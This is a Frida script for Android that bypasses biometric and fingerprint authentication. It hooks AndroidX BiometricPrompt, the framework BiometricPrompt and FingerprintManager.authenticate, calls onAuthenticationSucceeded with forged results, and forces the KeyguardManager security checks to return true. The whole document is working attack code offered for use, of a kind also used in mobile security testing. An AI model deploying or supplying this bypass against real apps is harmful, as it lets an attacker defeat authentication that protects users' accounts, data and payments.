/**
 * Android Biometrics & Fingerprint Authentication Bypass for Frida
 * Hooks:
 * 1. androidx.biometric.BiometricPrompt.AuthenticationCallback
 * 2. android.hardware.fingerprint.FingerprintManager.authenticate
 * 3. androidx.core.hardware.fingerprint.FingerprintManagerCompat.authenticate
 * 4. android.hardware.biometrics.BiometricPrompt.authenticate
 */

Java.perform(function () {
    console.log("[*] Initializing Biometrics & Fingerprint Authentication Bypass...");

    // 1. Hook AndroidX BiometricPrompt.AuthenticationCallback
    try {
        var BiometricPrompt = Java.use("androidx.biometric.BiometricPrompt");
        BiometricPrompt.authenticate.overload("androidx.biometric.BiometricPrompt$PromptInfo").implementation = function (promptInfo) {
            console.log("[+] Intercepted BiometricPrompt.authenticate(PromptInfo)");
            // Trigger onAuthenticationSucceeded on callback
            var callback = this.mAuthenticationCallback.value;
            if (callback) {
                var AuthenticationResult = Java.use("androidx.biometric.BiometricPrompt$AuthenticationResult");
                try {
                    var resultInstance = AuthenticationResult.$new(null, 2); // 2 = BIOMETRIC_ACQUIRED_GOOD
                    callback.onAuthenticationSucceeded(resultInstance);
                    console.log("[🎯] BiometricPrompt authentication bypassed via onAuthenticationSucceeded!");
                    return;
                } catch (err) {
                    console.log("[-] Fallback result constructor: " + err);
                }
            }
            return this.authenticate(promptInfo);
        };
    } catch (e) {
        console.log("[-] androidx.biometric.BiometricPrompt not present: " + e.message);
    }

    // 2. Hook Android Framework BiometricPrompt
    try {
        var NativeBiometricPrompt = Java.use("android.hardware.biometrics.BiometricPrompt");
        NativeBiometricPrompt.authenticate.overload(
            "android.os.CancellationSignal",
            "java.util.concurrent.Executor",
            "android.hardware.biometrics.BiometricPrompt$AuthenticationCallback"
        ).implementation = function (cancel, executor, callback) {
            console.log("[+] Intercepted android.hardware.biometrics.BiometricPrompt.authenticate()");
            var AuthenticationResult = Java.use("android.hardware.biometrics.BiometricPrompt$AuthenticationResult");
            var resultInstance = AuthenticationResult.$new(null, null, 0);
            callback.onAuthenticationSucceeded(resultInstance);
            console.log("[🎯] Framework BiometricPrompt authentication bypassed!");
        };
    } catch (e) {
        console.log("[-] android.hardware.biometrics.BiometricPrompt not present: " + e.message);
    }

    // 3. Hook Legacy FingerprintManager
    try {
        var FingerprintManager = Java.use("android.hardware.fingerprint.FingerprintManager");
        FingerprintManager.authenticate.overload(
            "android.hardware.fingerprint.FingerprintManager$CryptoObject",
            "android.os.CancellationSignal",
            "int",
            "android.hardware.fingerprint.FingerprintManager$AuthenticationCallback",
            "android.os.Handler"
        ).implementation = function (crypto, cancel, flags, callback, handler) {
            console.log("[+] Intercepted FingerprintManager.authenticate()");
            var AuthenticationResult = Java.use("android.hardware.fingerprint.FingerprintManager$AuthenticationResult");
            var resultInstance = AuthenticationResult.$new(crypto, null, 0);
            callback.onAuthenticationSucceeded(resultInstance);
            console.log("[🎯] FingerprintManager authentication bypassed!");
        };
    } catch (e) {
        console.log("[-] android.hardware.fingerprint.FingerprintManager not present: " + e.message);
    }

    // 4. Hook KeyguardManager.isDeviceSecure / isKeyguardSecure
    try {
        var KeyguardManager = Java.use("android.app.KeyguardManager");
        KeyguardManager.isDeviceSecure.implementation = function () {
            console.log("[+] KeyguardManager.isDeviceSecure() called -> returning true");
            return true;
        };
        KeyguardManager.isKeyguardSecure.implementation = function () {
            console.log("[+] KeyguardManager.isKeyguardSecure() called -> returning true");
            return true;
        };
    } catch (e) {
        // Ignored
    }

    console.log("[+] Biometrics bypass hooks successfully registered.");
});
